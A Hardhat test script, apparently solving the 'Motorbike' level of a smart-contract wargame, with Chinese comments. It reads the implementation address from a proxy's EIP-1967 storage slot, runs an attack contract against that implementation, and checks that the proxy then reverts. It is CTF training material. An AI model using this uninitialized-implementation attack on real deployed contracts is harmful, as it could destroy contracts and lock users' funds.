const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("25Motorbike", function () {
  let player, levelOwner, levelContract, runContract;
  const MAX_BALANCE = ethers.utils.parseEther("1");
  const INIT_LEVEL_BALANCE = ethers.utils.parseEther("0.001");
  it("setup", async function () {
    [player, levelOwner] = await ethers.getSigners();
    const engineContract = await tools.deployContract("Engine", levelOwner);
    levelContract = await tools.deployContract(
      "Motorbike",
      levelOwner,
      engineContract.address
    );
    //由于是代理切换成impl的abi
    levelContract = await ethers.getContractAt("Engine", levelContract.address);

    runContract = await tools.deployContract("MotorbikeRun", player);
    //检测原始状态
    expect(await levelContract.horsePower()).to.equal(1000);
  });

  it("attacks", async function () {
    //impl的合约地址可以从proxy的storage取
    let enginImplAddr = await tools.getStorageAt(
      levelContract.address,
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    );

    //取出来的byte32的，合约是存放在后面的20个bytes,所以对应16进制就是40个字符
    enginImplAddr = "0x" + enginImplAddr.slice(-40);

    await runContract.connect(player).run(enginImplAddr);
  });

  it("check", async function () {
    //检查通过条件
    await expect(levelContract.horsePower()).to.be.reverted;
  });
});
